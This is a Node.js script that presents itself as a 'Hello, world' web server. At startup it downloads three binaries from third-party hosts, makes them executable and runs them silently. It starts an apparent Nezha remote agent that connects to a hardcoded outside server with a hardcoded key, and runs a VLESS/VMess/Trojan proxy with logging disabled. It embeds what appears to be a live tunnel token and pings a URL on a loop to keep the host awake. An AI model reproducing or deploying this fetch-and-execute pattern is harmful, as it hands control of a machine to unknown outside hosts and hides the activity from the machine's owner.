const fs = require('fs').promises;
const path = require('path');
const http = require('http');
const { exec } = require('child_process');
const fetch = require('node-fetch');
const base64 = require('base64-js');

// Environment variables
const FILE_PATH = process.env.FILE_PATH || './tmp';
const PROJECT_URL = process.env.URL || '';
const INTERVAL_SECONDS = parseInt(process.env.TIME || '120');
const UUID = process.env.UUID || 'faacf142-dee8-48c2-8558-641123eb939c';
const NEZHA_SERVER = process.env.NEZHA_SERVER || 'nezha.mingfei1981.eu.org';
const NEZHA_PORT = process.env.NEZHA_PORT || '443';
const NEZHA_KEY = process.env.NEZHA_KEY || 'l5GINS8lct8Egroitn';
const ARGO_DOMAIN = process.env.ARGO_DOMAIN || 'appwrite.ncaa.nyc.mn';
const ARGO_AUTH = process.env.ARGO_AUTH || 'eyJhIjoiOTk3ZjY4OGUzZjBmNjBhZGUwMWUxNGRmZTliOTdkMzEiLCJ0IjoiZDQzMTc4YTEtZGRmYy00YTkwLWI0YzAtNzNkODUwYzY3NDdmIiwicyI6IlptWm1NMlppT0RZdE1tRTFOeTAwTlRVd0xUbGhaV0V0WmpsaFl6VTFOV0k0TVRCbSJ9';
const ARGO_PORT = parseInt(process.env.ARGO_PORT || '8001');
const CFIP = process.env.CFIP || 'www.visa.com.tw';
const CFPORT = parseInt(process.env.CFPORT || '443');
const NAME = process.env.NAME || 'Vls';
const PORT = parseInt(process.env.SERVER_PORT || process.env.PORT || '3000');

// Create directory if it doesn't exist
async function setupDirectory() {
    try {
        await fs.mkdir(FILE_PATH, { recursive: true });
        console.log(`${FILE_PATH} has been created`);
    } catch (error) {
        console.log(`${FILE_PATH} already exists`);
    }

    // Clean old files
    const pathsToDelete = ['boot.log', 'list.txt', 'sub.txt', 'npm', 'web', 'bot', 'tunnel.yml', 'tunnel.json'];
    for (const file of pathsToDelete) {
        try {
            await fs.unlink(path.join(FILE_PATH, file));
            console.log(`${path.join(FILE_PATH, file)} has been deleted`);
        } catch (error) {
            console.log(`Skip Delete ${path.join(FILE_PATH, file)}`);
        }
    }
}

// HTTP Server
const server = http.createServer((req, res) => {
    if (req.url === '/') {
        res.writeHead(200);
        res.end('Hello, world');
    } else if (req.url === '/sub') {
        fs.readFile(path.join(FILE_PATH, 'sub.txt'))
            .then(content => {
                res.writeHead(200, { 'Content-Type': 'text/plain; charset=utf-8' });
                res.end(content);
            })
            .catch(() => {
                res.writeHead(500);
                res.end('Error reading file');
            });
    } else {
        res.writeHead(404);
        res.end('Not found');
    }
});

server.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});

// Generate config file
async function generateConfig() {
    const config = {
        log: { access: "/dev/null", error: "/dev/null", loglevel: "none" },
        inbounds: [
            {
                port: ARGO_PORT,
                protocol: "vless",
                settings: {
                    clients: [{ id: UUID, flow: "xtls-rprx-vision" }],
                    decryption: "none",
                    fallbacks: [
                        { dest: 3001 },
                        { path: "/vless-argo", dest: 3002 },
                        { path: "/vmess-argo", dest: 3003 },
                        { path: "/trojan-argo", dest: 3004 }
                    ]
                },
                streamSettings: { network: "tcp" }
            },
            // Add other inbounds configurations here (similar to Python version)
        ],
        dns: { servers: ["https+local://8.8.8.8/dns-query"] },
        outbounds: [
            { protocol: "freedom", tag: "direct" },
            { protocol: "blackhole", tag: "block" }
        ]
    };

    await fs.writeFile(
        path.join(FILE_PATH, 'config.json'),
        JSON.stringify(config, null, 2),
        'utf-8'
    );
}

// System architecture detection
function getSystemArchitecture() {
    const arch = process.arch;
    return (arch.includes('arm') || arch === 'arm64') ? 'arm' : 'amd';
}

// Download file
async function downloadFile(fileName, fileUrl) {
    const response = await fetch(fileUrl);
    const buffer = await response.buffer();
    await fs.writeFile(path.join(FILE_PATH, fileName), buffer);
}

// Main execution function
async function downloadFilesAndRun() {
    await setupDirectory();
    await generateConfig();

    const architecture = getSystemArchitecture();
    const filesToDownload = {
        arm: [
            { fileName: 'npm', fileUrl: 'https://arm64.ssss.nyc.mn/agent' },
            { fileName: 'web', fileUrl: 'https://arm64.ssss.nyc.mn/web' },
            { fileName: 'bot', fileUrl: 'https://arm64.ssss.nyc.mn/2go' }
        ],
        amd: [
            { fileName: 'npm', fileUrl: 'https://amd64.ssss.nyc.mn/agent' },
            { fileName: 'web', fileUrl: 'https://amd64.ssss.nyc.mn/web' },
            { fileName: 'bot', fileUrl: 'https://amd64.ssss.nyc.mn/2go' }
        ]
    }[architecture];

    if (!filesToDownload) {
        console.log("Can't find files for the current architecture");
        return;
    }

    for (const file of filesToDownload) {
        try {
            await downloadFile(file.fileName, file.fileUrl);
            await fs.chmod(path.join(FILE_PATH, file.fileName), 0o775);
            console.log(`Downloaded and authorized ${file.fileName} successfully`);
        } catch (error) {
            console.log(`Download ${file.fileName} failed: ${error}`);
        }
    }

    // Run processes
    const validPorts = ['443', '8443', '2096', '2087', '2083', '2053'];
    const NEZHA_TLS = validPorts.includes(NEZHA_PORT) ? '--tls' : '';
    
    if (NEZHA_SERVER && NEZHA_PORT && NEZHA_KEY) {
        exec(`nohup ${path.join(FILE_PATH, 'npm')} -s ${NEZHA_SERVER}:${NEZHA_PORT} -p ${NEZHA_KEY} ${NEZHA_TLS} >/dev/null 2>&1 &`);
    }

    exec(`nohup ${path.join(FILE_PATH, 'web')} -c ${path.join(FILE_PATH, 'config.json')} >/dev/null 2>&1 &`);
}

// Visit project page
let hasLoggedEmptyMessage = false;

async function visitProjectPage() {
    if (!PROJECT_URL || !INTERVAL_SECONDS) {
        if (!hasLoggedEmptyMessage) {
            console.log("URL or TIME variable is empty, Skipping visit web");
            hasLoggedEmptyMessage = true;
        }
        return;
    }

    try {
        await fetch(PROJECT_URL);
        console.log("Page visited successfully");
    } catch (error) {
        console.log(`Error visiting project page: ${error}`);
    }
}

// Start the application
async function start() {
    await downloadFilesAndRun();
    // Add other initialization functions here
    
    setInterval(visitProjectPage, INTERVAL_SECONDS * 1000);
}

start().catch(console.error);
